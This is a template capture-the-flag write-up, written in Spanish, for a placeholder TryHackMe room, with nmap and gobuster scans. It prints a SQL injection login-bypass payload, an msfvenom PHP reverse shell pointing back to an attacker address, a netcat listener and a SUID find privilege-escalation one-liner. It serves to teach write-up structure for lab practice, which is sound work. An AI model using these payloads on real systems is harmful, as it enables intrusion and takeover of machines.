# Example Room - Getting Started

**Difficulty:** Easy  
**Room URL:** https://tryhackme.com/room/example  
**Date Completed:** 22/10/2025

---

## Description

Este es un ejemplo de write-up para demostrar la estructura y formato recomendado. En una sala real de TryHackMe, aquí describirías brevemente de qué trata el desafío.

---

## Reconnaissance

### Initial Scan

```bash
nmap -sC -sV -oN nmap_scan.txt 10.10.10.10
```

**Results:**
- Puerto 22 (SSH) abierto
- Puerto 80 (HTTP) abierto - Apache 2.4.41
- Puerto 3306 (MySQL) abierto

---

## Enumeration

### Web Server (Port 80)

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**
- `/admin` - Panel de administración
- `/uploads` - Directorio de archivos subidos
- `/config.php` - Archivo de configuración (acceso denegado)

---

## Exploitation

### SQL Injection en formulario de login

**Steps:**

1. Identificar vulnerabilidad SQLi en el campo de usuario
```bash
# Payload usado
admin' OR '1'='1' --
```

2. Obtener acceso al panel de administración
```bash
# Credenciales encontradas
Usuario: admin
Password: [obtenido mediante SQLi]
```

3. Subir reverse shell mediante función de upload
```bash
# Crear reverse shell
msfvenom -p php/reverse_php LHOST=10.8.0.1 LPORT=4444 -f raw > shell.php
```

4. Establecer listener y ejecutar shell
```bash
nc -lvnp 4444
# Navegar a http://10.10.10.10/uploads/shell.php
```

---

## Post-Exploitation

### Privilege Escalation

```bash
# Encontrar binarios con SUID
find / -perm -u=s -type f 2>/dev/null

# Explotar /usr/bin/find
find . -exec /bin/sh -p \; -quit
```

### Flags

- **User Flag:** `THM{example_user_flag_here}`
- **Root Flag:** `THM{example_root_flag_here}`

---

## Tools Used

- **Nmap** - Escaneo de puertos y servicios
- **Gobuster** - Enumeración de directorios web
- **Msfvenom** - Generación de reverse shell
- **Netcat** - Listener para conexión reversa

---

## Key Learnings

- Siempre verificar sanitización de inputs en formularios web
- La enumeración exhaustiva es clave para encontrar vectores de ataque
- Los binarios SUID pueden ser aprovechados para escalada de privilegios
- Mantener un registro detallado facilita el proceso de write-up

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
